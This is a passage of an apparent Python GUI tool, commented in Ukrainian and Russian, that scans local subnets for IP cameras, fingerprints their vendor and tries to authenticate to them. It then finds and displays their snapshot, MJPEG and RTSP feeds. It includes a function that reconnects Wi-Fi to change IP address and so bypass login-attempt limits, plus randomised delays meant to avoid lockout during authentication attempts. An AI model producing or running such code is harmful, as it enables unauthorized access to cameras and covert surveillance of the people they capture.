                except Exception:
                    continue
    
    return False

def find_photo_url(session, base_url, auth, checked_urls=None):
    """Універсальна функція пошуку URL фото з використанням плагінів"""
    
    if checked_urls is None:
        checked_urls = set()
        
    
    vendor = detect_camera_vendor(session, base_url)
    log(f"[*] Визначено ймовірного виробника: {vendor}")
    
    
    registry = VendorRegistry()
    vendor_plugin = registry.get_vendor_by_name(vendor)
    
    if not vendor_plugin:
        
        vendor_plugin = registry.get_vendor_by_name("generic")
        log(f"[*] Плагін для {vendor} не знайдено. Використовую универсальний плагін")
    
    
    paths_to_try = get_enhanced_vendor_paths(session, base_url, vendor)
    
    
    if vendor == "dlink" and "dcs" in base_url.lower():
        model = extract_dlink_model(base_url)
        if model:
            paths_to_try.append(f"/{model}/image.jpg")
            paths_to_try.append(f"/{model}/video.mjpg")
            paths_to_try.append(f"/{model}/mjpeg.cgi")
    
    
    if vendor_plugin.name != "generic":
        
        generic_plugin = registry.get_vendor_by_name("generic")
        if generic_plugin:
            paths_to_try.extend(generic_plugin.get_paths("photo"))
    
    
    for path in paths_to_try:
        try:
            url = f"{base_url}{path}"
            
            
            if url in checked_urls:
                log(f"[*] URL вже перевірено: {url}")
                continue
                
            
            checked_urls.add(url)
            
            r = session.get(url, timeout=HTTP_TIMEOUT, auth=auth, verify=False)
            
            if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
                log(f"[+] Знайдено URL фото: {url}")
                return url
        except Exception:
            continue
    
    return None

def find_video_url(session, base_url, auth, checked_urls=None):
    """Універсальна функція пошуку URL відео з використанням плагінів"""
    
    if checked_urls is None:
        checked_urls = set()
        
    
    vendor = detect_camera_vendor(session, base_url)
    
    
    registry = VendorRegistry()
    vendor_plugin = registry.get_vendor_by_name(vendor)
    
    if not vendor_plugin:
        
        vendor_plugin = registry.get_vendor_by_name("generic")
    
    
    paths_to_try = get_enhanced_vendor_paths(session, base_url, vendor)
    
    
    if vendor == "dlink":
        
        model = extract_dlink_model(base_url)
        if model:
            paths_to_try.append(f"/{model}/mjpeg.cgi")
            paths_to_try.append(f"/{model}/video.mjpg")
    
    
    if vendor_plugin.name != "generic":
        
        generic_plugin = registry.get_vendor_by_name("generic")
        if generic_plugin:
            paths_to_try.extend(generic_plugin.get_paths("video"))
    
    
    for path in paths_to_try:
        try:
            url = f"{base_url}{path}"
            
            
            if url in checked_urls:
                log(f"[*] URL вже перевірено: {url}")
                continue
                
            
            checked_urls.add(url)
            
            log(f"[*] Тестування відео потоку: {url}")
            r = session.get(url, timeout=HTTP_TIMEOUT, auth=auth, verify=False, stream=True)
            
            
            if r.status_code == 200 and ('multipart' in r.headers.get('Content-Type', '').lower()):
                log(f"[+] Знайдено MJPEG відео URL: {url}")
                return url
                
            
            if r.status_code == 200 and any(v_type in r.headers.get('Content-Type', '').lower() 
                                         for v_type in ['video', 'stream', 'mpg', 'mp4', 'octet-stream']):
                log(f"[+] Знайдено відео URL: {url}")
                return url
                
            
            if r.status_code == 200 and vendor == "dlink":
                log(f"[+] Знайдено потенційний D-Link відео URL: {url}")
                return url
                
        except Exception:
            continue
    
    return None

def get_enhanced_vendor_paths(session, base_url, vendor, stream_type="photo"):
    """Получает расширенный список путей на основе детального анализа камеры
    
    Args:
        session: Сессия requests для HTTP запросов
        base_url: Базовый URL камеры
        vendor: Производитель камеры
        stream_type: Тип потока ("photo" или "video")
        
    Returns:
        list: Список путей соответствующего типа
    """
    paths = []
    registry = VendorRegistry()
    
    
    vendor_plugin = registry.get_vendor_by_name(vendor)
    if not vendor_plugin:
        vendor_plugin = registry.get_vendor_by_name("generic")
    
    
    paths.extend(vendor_plugin.get_paths(stream_type))
    
    
    if vendor == "dlink":
        
        model = extract_dlink_model(base_url)
        if model:
            if stream_type == "photo":
                paths.append(f"/{model}/image.jpg")
                paths.append(f"/{model}/image/jpeg.cgi")
            elif stream_type == "video":
                paths.append(f"/{model}/video.mjpg")
                paths.append(f"/{model}/mjpeg.cgi")
                paths.append(f"/{model}/video/mjpg.cgi")
    elif vendor == "hikvision":
        
        if stream_type == "photo":
            try:
                r = session.get(f"{base_url}/SDK/version", timeout=1.0, verify=False)
                if r.status_code == 200:
                    if "IPC" in r.text:
                        
                        paths.append("/ISAPI/Streaming/channels/201/picture")
                        paths.append("/ISAPI/Streaming/channels/301/picture")
                    elif "NVR" in r.text:
                        
                        for i in range(1, 9):  
                            paths.append(f"/ISAPI/Streaming/channels/{i}/picture")
                            paths.append(f"/ISAPI/Streaming/channels/{i}01/picture")
            except:
                pass
        elif stream_type == "video":
            try:
                r = session.get(f"{base_url}/SDK/version", timeout=1.0, verify=False)
                if r.status_code == 200:
                    if "IPC" in r.text:
                        
                        paths.append("/ISAPI/Streaming/channels/201/httpPreview")
                        paths.append("/ISAPI/Streaming/channels/301/httpPreview")
                    elif "NVR" in r.text:
                        
                        for i in range(1, 9):
                            paths.append(f"/ISAPI/Streaming/channels/{i}/httpPreview")
                            paths.append(f"/ISAPI/Streaming/channels/{i}01/httpPreview")
            except:
                pass
    
    
    if vendor_plugin.name != "generic":
        generic_plugin = registry.get_vendor_by_name("generic")
        if generic_plugin:
            paths.extend(generic_plugin.get_paths(stream_type))
    
    
    return list(dict.fromkeys(paths))

def enhance_vendor_detection(session, base_url):
    """Расширенное определение производителя камеры на основе нескольких источников"""
    
    
    try:
        response = session.get(base_url, timeout=2.0, verify=False)
        headers = response.headers
        content = response.text.lower()
        
        
        server = headers.get('Server', '').lower()
        
        
        vendor_signatures = {
            'hikvision': ['hikvision', 'webdvs', 'dvr-webserver', 'dnvrs-webs'],
            'dahua': ['dahua', 'cgi-bin/dhweb', 'dhfs-cgi', 'cgi-bin/configManager.cgi'],
            'axis': ['axis', 'boa/', 'axis2', 'axiscamera'],
            'dlink': ['dlink', 'd-link', 'dcs-', 'alphanetworks'],
            'foscam': ['foscam', 'ipcam', 'netwave', 'wificam'],
            'reolink': ['reolink', 'baichuan'],
            'ubiquiti': ['ubiquiti', 'unifi', 'aircam'],
            'tp-link': ['tp-link', 'tplink', 'tl-', 'nc2'],
            'sony': ['sony', 'ipela', 'snc-'],
            'panasonic': ['panasonic', 'i-pro', 'bb-'],
            'mobotix': ['mobotix', 'mx-'],
            'bosch': ['bosch', 'vip-'],
            'vivotek': ['vivotek', 'speedlink']
        }
        
        
        for vendor, patterns in vendor_signatures.items():
            if any(pattern in server for pattern in patterns):
                return vendor
            if any(pattern in content for pattern in patterns):
                return vendor
                
        
        api_endpoints = {
            'hikvision': ['/ISAPI/', '/doc/page/login.asp'],
            'dahua': ['/cgi-bin/configManager.cgi', '/RPC2_Login'],
            'axis': ['/axis-cgi/', '/view/view.shtml'],
            'foscam': ['/cgi-bin/CGIProxy.fcgi', '/videostream.cgi'],
            'reolink': ['/cgi-bin/api.cgi', '/cgi-bin/luci']
        }
        
        for vendor, endpoints in api_endpoints.items():
            for endpoint in endpoints:
                try:
                    endpoint_url = base_url.rstrip('/') + endpoint
                    r = session.head(endpoint_url, timeout=1.0, verify=False)
                    if r.status_code != 404:  
                        return vendor
                except:
                    continue
    except:
        pass
        
    return "generic"  

def detect_camera_vendor(session, base_url):
    """Визначає виробника камери на основі URL та відповіді сервера"""
    
    ip = base_url.split("://")[1].split(":")[0]
     
    
    base_url_lower = base_url.lower()
    
    if "hikvision" in base_url_lower:
        return "hikvision"
    elif "dahua" in base_url_lower:
        return "dahua"
    elif "axis" in base_url_lower:
        return "axis"
    elif "dlink" in base_url_lower or "d-link" in base_url_lower or "dcs" in base_url_lower:
        return "dlink"
    elif "foscam" in base_url_lower:
        return "foscam"
    elif "reolink" in base_url_lower:
        return "reolink"
    elif "sony" in base_url_lower:
        return "sony"
    elif "bosch" in base_url_lower:
        return "bosch"
    
    
    try:
        r = session.get(f"{base_url}/", timeout=HTTP_TIMEOUT, verify=False)
        headers = r.headers
        server = headers.get('Server', '').lower()
        content = r.text.lower()
        
        
        if "hikvision" in server:
            return "hikvision"
        elif "dahua" in server:
            return "dahua"
        elif "axis" in server:
            return "axis"
        elif "dlink" in server or "d-link" in server or "dcs" in server:
            return "dlink"
        elif "foscam" in server:
            return "foscam"
        elif "sony" in server:
            return "sony"
        elif "panasonic" in server:
            return "panasonic"
        elif "bosch" in server:
            return "bosch"
        elif "instar" in server:
            return "instar"
        
        
        if "hikvision" in content:
            return "hikvision"
        elif "dahua" in content:
            return "dahua"
        elif "axis" in content:
            return "axis"
        elif "d-link" in content or "dlink" in content or "dcs" in content:
            return "dlink"
        elif "foscam" in content:
            return "foscam"
        elif "sony" in content:
            return "sony"
        elif "panasonic" in content:
            return "panasonic"
        elif "bosch" in content:
            return "bosch"
        elif "instar" in content:
            return "instar"
        elif "reolink" in content:
            return "reolink"
        elif "avigilon" in content:
            return "avigilon"
    except:
        pass
    
    
    return "generic"

def rotate_ip_address():
    """Змінює IP-адресу комп'ютера для обходу обмежень кількості спроб (для Linux)"""
    try:
        
        interface = get_wifi_interface()
        
        
        current_ip = subprocess.check_output(f"ip addr show {interface}", shell=True).decode()
        log(f"[*] Поточна IP-адреса: {current_ip.split('inet ')[1].split('/')[0] if 'inet ' in current_ip else 'не визначено'}")
        
        
        log("[*] Зміна IP-адреси...")
        
        
        current_ssid = subprocess.check_output("iwgetid -r", shell=True).decode().strip()
        current_password = ""  
        
        
        subprocess.run(f"nmcli connection delete {current_ssid}", shell=True)
        
        
        time.sleep(2)
        
        
        connect_to_wifi(current_ssid, current_password)
        
        
        new_ip = subprocess.check_output(f"ip addr show {interface}", shell=True).decode()
        log(f"[+] Нова IP-адреса: {new_ip.split('inet ')[1].split('/')[0] if 'inet ' in new_ip else 'не визначено'}")
        
        return True
    except Exception as e:
        log(f"[!] Помилка при зміні IP-адреси: {e}")
        return False

def delay_between_attempts(attempt_count, ip):
    """Інтелектуальні затримки між спробами автентифікації для запобігання блокуванню"""
    
    base_delay = 0.5
    
    
    if attempt_count > 20:
        delay = base_delay * 4  
    elif attempt_count > 10:
        delay = base_delay * 2  
    elif attempt_count > 5:
        delay = base_delay * 1.5  
    else:
        delay = base_delay  
    
    
    random_factor = random.uniform(0.75, 1.25)
    final_delay = delay * random_factor
    
    
    time.sleep(final_delay)
    return final_delay

def check_rtsp_url(ip, auth):
    """Покращений пошук RTSP URL з використанням плагінів"""
    
    vendor = "generic"
    
    try:
        
        session = requests.Session()
        r = session.get(f"http://{ip}:80/", timeout=HTTP_TIMEOUT, verify=False)
        headers = r.headers
        server = headers.get('Server', '').lower()
        content = r.text.lower()
        
        if "hikvision" in server or "hikvision" in content:
            vendor = "hikvision"
        elif "dahua" in server or "dahua" in content:
            vendor = "dahua"
        elif "axis" in server or "axis" in content:
            vendor = "axis"
        elif "dlink" in server or "d-link" in server or "dcs" in server or "dlink" in content or "d-link" in content:
            vendor = "dlink"
    except:
        pass
    
    
    registry = VendorRegistry()
    vendor_plugin = registry.get_vendor_by_name(vendor)
    
    if not vendor_plugin:
        
        vendor_plugin = registry.get_vendor_by_name("generic")
    
    
    rtsp_paths = vendor_plugin.get_rtsp_paths()
    
    
    if vendor_plugin.name != "generic":
        generic_plugin = registry.get_vendor_by_name("generic")
        rtsp_paths.extend(generic_plugin.get_rtsp_paths())
    
    
    rtsp_urls = []
    
    
    for path in rtsp_paths:
        rtsp_urls.append(f"rtsp://{ip}:554{path}")
    
    
    if auth and isinstance(auth, tuple) and len(auth) >= 2:
        user, password = auth
        for path in rtsp_paths:
            rtsp_urls.append(f"rtsp://{user}:{password}@{ip}:554{path}")
    
    
    
    if vendor == "hikvision":
        if auth and isinstance(auth, tuple) and len(auth) >= 2:
            user, password = auth
            return f"rtsp://{user}:{password}@{ip}:554/Streaming/Channels/1"
        return f"rtsp://{ip}:554/Streaming/Channels/1"
    elif vendor == "dahua":
        if auth and isinstance(auth, tuple) and len(auth) >= 2:
            user, password = auth
            return f"rtsp://{user}:{password}@{ip}:554/cam/realmonitor?channel=1&subtype=0"
        return f"rtsp://{ip}:554/cam/realmonitor?channel=1&subtype=0"
    elif vendor == "dlink":
        if auth and isinstance(auth, tuple) and len(auth) >= 2:
            user, password = auth
            return f"rtsp://{user}:{password}@{ip}:554/live.sdp"
        return f"rtsp://{ip}:554/live.sdp"
    
    
    if auth and isinstance(auth, tuple) and len(auth) >= 2:
        user, password = auth
        return f"rtsp://{user}:{password}@{ip}:554/stream1"
    return f"rtsp://{ip}:554/stream1"

def save_photo(session, url, ip, auth):
    """Save a photo from a URL"""
    try:
        r = session.get(url, timeout=HTTP_TIMEOUT, auth=auth, verify=False)
        if r.status_code == 200:
            filename = f"camera_{ip}_snapshot.jpg"
            with open(filename, "wb") as f:
                f.write(r.content)
            log(f"[+] Saved photo to {filename}")
            
            
            if ip in successful_streams:
                successful_streams[ip]['snapshot_path'] = filename
    except Exception as e:
        log(f"[!] Failed to save photo: {e}")

def test_ip(ip):
    """Test a specific IP address for camera functionality"""
    if stop_event.is_set() or ip in successful_streams: 
        return
        
    
    if ip in router_ips:
        log(f"\n[→] Testing router IP: {ip} (lower priority)")
    else:
        log(f"\n[→] Testing camera IP: {ip}")
    
    
    http_success = try_http(ip)
    if http_success or ip in successful_streams:
        log(f"[+] Successfully found HTTP camera at {ip}")
        return
    
    
    login_page = check_for_login_page(ip)
    if login_page:
        log(f"[+] Found potential camera login page at {ip}")
        return
        
    log(f"[-] No camera access methods successful on {ip}")

def scan_loop():
    """Improved scanning function with progress updates"""
    try:
        
        subnets = get_all_subnets()
        log(f"[*] Found {len(subnets)} subnets to scan: {', '.join(subnets)}")
        
        
        progress_var.set(5)
        status_var.set("Scanning for camera networks...")
        root.update_idletasks()
        
        
        for subnet_index, subnet in enumerate(subnets):
            if stop_event.is_set() or successful_streams:  
                break
                
            
            subnet_progress = 10 + (subnet_index / len(subnets)) * 20
            progress_var.set(subnet_progress)
            status_var.set(f"Scanning subnet {subnet} for cameras...")
            root.update_idletasks()
            
            log(f"[*] Scanning subnet {subnet} for cameras...")
            
            
            camera_ips = identify_camera_ips(subnet)
            
            if not camera_ips:
                log(f"[!] No potential cameras found on subnet {subnet}.")
                continue
            
            log(f"[+] Found {len(camera_ips)} potential cameras on {subnet}")
            status_var.set(f"Found {len(camera_ips)} potential cameras on {subnet}")
            
            
            progress_var.set(30)
            root.update_idletasks()
            
            
            for ip_index, ip in enumerate(camera_ips):
                if stop_event.is_set() or successful_streams:  
                    break
                    
                
                ip_progress = 30 + (ip_index / len(camera_ips)) * 60
                progress_var.set(ip_progress)
                status_var.set(f"Testing camera at {ip} ({ip_index+1}/{len(camera_ips)})")
                root.update_idletasks()
                
                log(f"[*] Testing camera at {ip}")
                
                
                for port in [80, 8080, 8081, 8000, 443]:
                    if stop_event.is_set() or successful_streams:
                        break
                        
                    
                    if not is_camera_port_open(ip, port):
                        continue
                    
                    
                    protocols = ["http"] if port != 443 else []
                    protocols.append("https")
                    
                    for protocol in protocols:
                        if stop_event.is_set() or successful_streams:
                            break
                            
                        success = try_camera_auth(ip, port, protocol)
                        if success:
                            log(f"[+] Successfully configured camera at {ip}!")
                            break
            
            
            if successful_streams:
                log("[+] Camera found and configured successfully! Stopping scan.")
                break
                
        
        if successful_streams:
            log("\n[=== SUCCESS ===]")
            for ip, data in successful_streams.items():
                log(f"[+] Camera found at {ip}:")
                log(f"    Base URL: {data['base_url']}")
                log(f"    Auth: {data['auth'] if data['auth'] else 'None'}")
                log(f"    Photo URL: {data['photo_url'] if 'photo_url' in data else 'Not found'}")
                log(f"    Video URL: {data['video_url'] if 'video_url' in data else 'Not found'}")
            
            log("[*] Use the 'Open Viewer' button to view the camera stream")
        else:
            log("[!] No cameras found or configured. Try scanning again with different settings.")
            
    except Exception as e:
        log(f"[!] Error in scan loop: {e}")


class CameraViewer:
    def __init__(self, master):
        self.master = master
        master.title("Camera Viewer")
        master.geometry("800x600")
        
        
        self.status_var = tk.StringVar()
        self.status_var.set("Ready. Select a camera and click Load to view.")
        self.camera_var = tk.StringVar()
        self.viewing = False
        self.current_ip = None
        self.cap = None
        self.current_image = None
        self.current_frame = None
        self.info_text = None  
        self.is_closing = False
        
        
        self.main_frame = ttk.Frame(master)
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    
         
        
        
        self.camera_frame = ttk.Frame(self.main_frame)
        self.camera_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(self.camera_frame, text="Select Camera:").pack(side=tk.LEFT, padx=5)
        
        self.camera_var = tk.StringVar()
        self.camera_dropdown = ttk.Combobox(self.camera_frame, textvariable=self.camera_var, state="readonly")
        self.camera_dropdown.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        
        self.update_camera_dropdown()
            
        
        ttk.Button(self.camera_frame, text="Load", command=self.start_viewing).pack(side=tk.LEFT, padx=5)
        ttk.Button(self.camera_frame, text="Stop", command=self.stop_viewing).pack(side=tk.LEFT, padx=5)
        ttk.Button(self.camera_frame, text="Stream Info", command=self.show_stream_info).pack(side=tk.LEFT, padx=5)
        ttk.Button(self.camera_frame, text="Save Snapshot", command=self.save_current_snapshot).pack(side=tk.LEFT, padx=5)
        ttk.Button(self.camera_frame, text="Save Video", command=self.save_direct_stream_video).pack(side=tk.LEFT, padx=5)
        ttk.Button(self.camera_frame, text="Delete Camera", command=self.delete_selected_camera).pack(side=tk.LEFT, padx=5)
        
        
        self.video_frame = ttk.LabelFrame(self.main_frame, text="Camera Feed")
        self.video_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        
        window_height = master.winfo_height()
        video_height = int(window_height * 0.7)  
        self.video_frame.config(height=video_height)
        
        
        self.video_frame.pack_propagate(False)
        
        self.video_label = ttk.Label(self.video_frame)
        self.video_label.pack(fill=tk.BOTH, expand=True)
        
        
        self.video_label.config(width=640, height=480)

        
        self.video_frame.pack_propagate(False)

        
        def configure_video_frame(event):
            if hasattr(self, 'current_frame') and self.current_frame is not None:
                
                self.display_frame(self.current_frame)

        
        self.video_frame.bind('<Configure>', configure_video_frame)
       
        self.info_frame = ttk.LabelFrame(self.main_frame, text="Stream Info")
        self.info_frame.pack(fill=tk.X, padx=5, pady=5)
        
        
        self.info_frame.config(height=100)  
        self.info_frame.pack_propagate(False)
        
        self.info_text = scrolledtext.ScrolledText(self.info_frame, wrap=tk.WORD, height=5)  
        self.info_text.pack(fill=tk.BOTH, expand=True)
        
        
        self.status_var = tk.StringVar()
        self.status_var.set("Ready. Select a camera and click Load to view.")
        self.status_bar = ttk.Label(master, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
        
        self.cap = None
        self.viewing = False
        self.current_ip = None
        
        
        self.current_image = None
        
        
        self.camera_dropdown.bind("<<ComboboxSelected>>", self.update_stream_info_on_select)
            
        
        master.protocol("WM_DELETE_WINDOW", self.on_close)

    

    
        def on_window_resize(event):
            """Handle window resize to maintain proper proportions"""
            if event.widget == self.master:
                
                window_height = self.master.winfo_height()
                video_height = int(window_height * 0.65)  
                info_height = 100  
                
                
                if hasattr(self, 'video_frame'):
                    self.video_frame.config(height=video_height)
                
                if hasattr(self, 'info_frame'):
                    self.info_frame.config(height=info_height)
                    
                
                if hasattr(self, 'current_frame') and self.current_frame is not None:
                    self.display_frame(self.current_frame)

        
        self.master.bind("<Configure>", on_window_resize)

    def update_camera_dropdown(self):
        """Update camera dropdown with IP and vendor information"""
        camera_options = []
        for ip, data in successful_streams.items():
            camera_options.append(format_camera_display(ip, data))
        
        self.camera_dropdown['values'] = camera_options
        if camera_options:
            self.camera_dropdown.current(0)

    def get_selected_camera_ip(self):
        """Get the IP of the currently selected camera"""
        selected = self.camera_var.get()
        return extract_ip_from_display(selected)

    def update_mjpeg_frame(self):
        """Universal frame update method for MJPEG streams from any camera vendor"""
        session = requests.Session()
        
        auth = None
        if self.http_stream_auth:
            auth = HTTPBasicAuth(*self.http_stream_auth)
        
        log("[*] Starting HTTP MJPEG stream update loop")
        log(f"[DEBUG] Stream URL: {self.http_stream_url}")
        log(f"[DEBUG] Auth: {self.http_stream_auth}")
        frame_count = 0
        last_fps_time = time.time()
        
        try:
            
            response = session.get(
                self.http_stream_url, 
                auth=auth, 
                stream=True,
                verify=False,
                timeout=5.0
            )
            
            log(f"[DEBUG] Response status code: {response.status_code}")
            log(f"[DEBUG] Response headers: {response.headers}")
            
            if response.status_code == 200:
                content_type = response.headers.get('Content-Type', '')
                log(f"[DEBUG] Content-Type: {content_type}")
                
                
                if 'image/jpeg' in content_type and 'multipart' not in content_type:
                    log("[*] Processing stream with JPEG content type")
                    buffer = bytes()
                    
                    
                    for chunk in response.iter_content(chunk_size=1024):
                        if not self.viewing:
                            break
                        
                        buffer += chunk
                        start_idx = buffer.find(b'\xff\xd8')  
                        end_idx = buffer.find(b'\xff\xd9')    
                        
                        if start_idx != -1 and end_idx != -1 and start_idx < end_idx:
                            
                            jpeg_data = buffer[start_idx:end_idx+2]
                            buffer = buffer[end_idx+2:]
                            
                            
                            nparr = np.frombuffer(jpeg_data, np.uint8)
                            frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                            
                            if frame is not None:
                                self.display_frame(frame)
                                frame_count += 1
                                
                                
                                current_time = time.time()
                                elapsed = current_time - last_fps_time
                                if elapsed > 1.0:
                                    fps = frame_count / elapsed
                                    self.status_var.set(f"Stream from {self.current_ip} - FPS: {fps:.1f}")
                                    frame_count = 0
                                    last_fps_time = current_time
                
                
                elif 'multipart' in content_type:
                    log("[*] Processing standard multipart MJPEG stream")
                    buffer = bytes()
                    
                    
                    boundary = None
                    if 'boundary=' in content_type:
                        try:
                            boundary = content_type.split('boundary=')[1].strip()
                            log(f"[DEBUG] Using boundary: {boundary}")
                        except:
                            log("[DEBUG] Could not extract boundary, using marker detection")
                    
                    for chunk in response.iter_content(chunk_size=16384):
                        if not self.viewing:
                            break
                            
                        buffer += chunk
                        
                        
                        start_marker = b'\xff\xd8'
                        end_marker = b'\xff\xd9'
                        
                        start_idx = buffer.find(start_marker)
                        end_idx = buffer.find(end_marker, start_idx) if start_idx != -1 else -1
                        
                        while start_idx != -1 and end_idx != -1:
                            jpeg_data = buffer[start_idx:end_idx+2]
                            buffer = buffer[end_idx+2:]
                            
                            
                            nparr = np.frombuffer(jpeg_data, np.uint8)
                            frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                            
                            if frame is not None:
                                self.display_frame(frame)
                                frame_count += 1
                                
                                
                                current_time = time.time()
                                elapsed = current_time - last_fps_time
                                if elapsed > 1.0:
                                    fps = frame_count / elapsed
                                    self.status_var.set(f"MJPEG stream from {self.current_ip} - FPS: {fps:.1f}")
                                    frame_count = 0
                                    last_fps_time = current_time
                            
                            
                            start_idx = buffer.find(start_marker)
                            end_idx = buffer.find(end_marker, start_idx) if start_idx != -1 else -1
                
                
                elif 'image/jpeg' in content_type:
                    log("[*] Processing single JPEG image")
                    img_array = np.asarray(bytearray(response.content), dtype=np.uint8)
                    frame = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
                    
                    if frame is not None:
                        self.display_frame(frame)
                        self.status_var.set(f"Still image from {self.current_ip}")
                
                
                else:
                    log(f"[*] Unknown content type: {content_type}, attempting universal frame detection")
                    buffer = bytes()
                    
                    for chunk in response.iter_content(chunk_size=8192):
                        if not self.viewing:
                            break
                        
                        buffer += chunk
                        
                        
                        start_marker = b'\xff\xd8'
                        end_marker = b'\xff\xd9'
                        
                        start_idx = buffer.find(start_marker)
                        end_idx = buffer.find(end_marker, start_idx) if start_idx != -1 else -1
                        
                        while start_idx != -1 and end_idx != -1:
                            jpeg_data = buffer[start_idx:end_idx+2]
                            buffer = buffer[end_idx+2:]
                            
                            
                            nparr = np.frombuffer(jpeg_data, np.uint8)
                            frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                            
                            if frame is not None:
                                self.display_frame(frame)
                                frame_count += 1
                                
                                
                                if frame_count == 1:
                                    log(f"[+] Successfully detected JPEG frames in stream")
                                
                                
                                current_time = time.time()
                                elapsed = current_time - last_fps_time
                                if elapsed > 1.0:
                                    fps = frame_count / elapsed
                                    self.status_var.set(f"Video stream from {self.current_ip} - FPS: {fps:.1f}")
                                    frame_count = 0
                                    last_fps_time = current_time
                            
                            
                            start_idx = buffer.find(start_marker)
                            end_idx = buffer.find(end_marker, start_idx) if start_idx != -1 else -1
            else:
                log(f"[!] HTTP error: {response.status_code}")
        except Exception as e:
            log(f"[!] MJPEG stream error: {str(e)}")
        
        log("[*] HTTP MJPEG stream update loop ended")

    def delete_selected_camera(self):
        """Delete the selected camera from the list."""
        selected_ip = self.get_selected_camera_ip()
        if selected_ip in successful_streams:
            del successful_streams[selected_ip]
            self.camera_dropdown['values'] = list(successful_streams.keys())
            if successful_streams:
                self.camera_dropdown.current(0)
            else:
                self.camera_dropdown.set("")
            self.status_var.set(f"Deleted camera: {selected_ip}")
        else:
            self.status_var.set("No camera selected to delete.")

    def update_stream_info_on_select(self, event=None):
        """Update stream info when camera selection changes"""
        selected_ip = self.get_selected_camera_ip()
        if selected_ip in successful_streams:
            self.show_stream_info(display_messagebox=False)
            
            self.show_preview(selected_ip)

    def show_preview(self, ip):
        """Show a static preview of the camera"""
        if ip in successful_streams:
            stream_data = successful_streams[ip]
            
            
            if 'snapshot_path' in stream_data:
                try:
                    img = cv2.imread(stream_data['snapshot_path'])
                    self.display_frame(img)
                    self.status_var.set(f"Preview of {ip} - Click Load to start live view")
                except:
                    self.status_var.set(f"Failed to load preview for {ip}")
            elif 'photo_url' in stream_data:
                self.status_var.set(f"Camera found at {ip} - Click Load to see stream")
            else:
                self.status_var.set(f"No preview available for {ip}")
    
    def start_viewing(self):
        """Start viewing with improved streaming handler for problematic cameras"""
        ip = self.get_selected_camera_ip()
        if not ip or ip not in successful_streams:
            return
                
        self.stop_viewing()  
                
        stream_data = successful_streams[ip]
        self.current_ip = ip
                
        
        self.show_stream_info(display_messagebox=False)
        
        
        log(f"[*] Starting stream from {ip}")
        if 'video_url' in stream_data:
            log(f"[*] Video URL: {stream_data['video_url']}")
        if 'auth' in stream_data:
            log(f"[*] Auth: {stream_data['auth']}")
                
        if 'video_url' in stream_data and stream_data['video_url']:
            url = stream_data['video_url']
            auth = stream_data.get('auth')
                
            self.status_var.set(f"Connecting to video stream at {ip}...")
            
            
            log(f"[DEBUG] Video URL type: {type(url)}")
            log(f"[DEBUG] URL contents: {url}")
            
            
            def test_connection():
                try:
                    
                    is_mjpeg = False
                    if url:
                        is_mjpeg = ('mjpg' in url.lower() or 'mjpeg' in url.lower() or 'cgi' in url.lower())
                    
                    if is_mjpeg:
                        log(f"[*] Detected MJPEG stream, using HTTP streaming")
                        self.use_http_streaming = True
                        self.http_stream_url = url
                        self.http_stream_auth = auth
                        
                        
                        self.viewing = True
                        stream_thread = threading.Thread(target=self.update_mjpeg_frame, daemon=True)
                        stream_thread.start()
                        
                        
                        self.master.after(0, lambda: self.status_var.set(f"Viewing MJPEG stream from {ip}"))
                        
                    else:
                        
                        log(f"[*] Using FFMPEG for video stream")
                        
                        
                        url_with_auth = url
                        if auth and isinstance(auth, tuple) and len(auth) >= 2:
                            user, password = auth
                            
                            
                            if '@' not in url:
                                try:
                                    protocol, rest = url.split('://', 1)
                                    host = rest.split('/', 1)[0] if '/' in rest else rest
                                    path = '/' + rest.split('/', 1)[1] if '/' in rest else ''
                                    url_with_auth = f"{protocol}://{user}:{password}@{host}{path}"
                                except:
                                    url_with_auth = url
                        
                        log(f"[*] Opening stream with FFMPEG: {url_with_auth}")
                        
                        
                        self.cap = cv2.VideoCapture(url_with_auth, cv2.CAP_FFMPEG)
                        
                        
                        self.cap.set(cv2.CAP_PROP_BUFFERSIZE, 3)
                        
                        
                        ret, frame = self.cap.read()
                        if ret and frame is not None:
                            
                            self.frame_count = 0
                            self.last_update_time = time.time()
                            self.viewing = True
                            
                            stream_thread = threading.Thread(target=self.update_frame, daemon=True)
                            stream_thread.start()
                            
                            
                            self.master.after(0, lambda: self.status_var.set(f"Viewing stream from {ip}"))
                        else:
                            log(f"[!] Failed to get first frame, falling back to snapshot")
                            self.cap.release()
                            self.cap = None
                            
                            
                            self.master.after(0, lambda: self.show_snapshot_fallback(ip))
                except Exception as e:
                    log(f"[!] Error starting stream: {str(e)}")
                    
                    self.master.after(0, lambda: self.show_snapshot_fallback(ip))
            
            
            threading.Thread(target=test_connection, daemon=True).start()
        else:
            
            self.show_snapshot_fallback(ip)

    def show_snapshot_fallback(self, ip):
        """Show snapshot when video stream fails"""
        stream_data = successful_streams[ip]
        
        if 'snapshot_path' in stream_data:
            try:
                log(f"[*] Loading snapshot from {stream_data['snapshot_path']}")
                img = cv2.imread(stream_data['snapshot_path'])
                self.display_frame(img)
                self.status_var.set(f"Video stream not available, showing snapshot from {ip}")
            except Exception as e:
                log(f"[!] Error loading snapshot: {str(e)}")
                self.status_var.set(f"Failed to load media from {ip}")
        elif 'photo_url' in stream_data:
            try:
                auth = stream_data.get('auth')
                session = requests.Session()
                log(f"[*] Downloading snapshot from {stream_data['photo_url']}")
                response = session.get(stream_data['photo_url'], 
                                    auth=HTTPBasicAuth(*auth) if auth else None, 
                                    timeout=3.0, 
                                    verify=False)
                
                if response.status_code == 200:
                    
                    img_array = np.asarray(bytearray(response.content), dtype=np.uint8)
                    img = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
                    self.display_frame(img)
                    self.status_var.set(f"Video stream not available, showing photo from {ip}")
            except Exception as e:
                log(f"[!] Error downloading snapshot: {str(e)}")
                self.status_var.set(f"Failed to load media from {ip}")
        else:
            self.status_var.set(f"No media available for {ip}")

    def update_frame(self):
        """High-performance frame update loop with better error handling and FPS control"""
        last_frame = None
        empty_frame_count = 0
        max_empty_frames = 10
        frame_count = 0
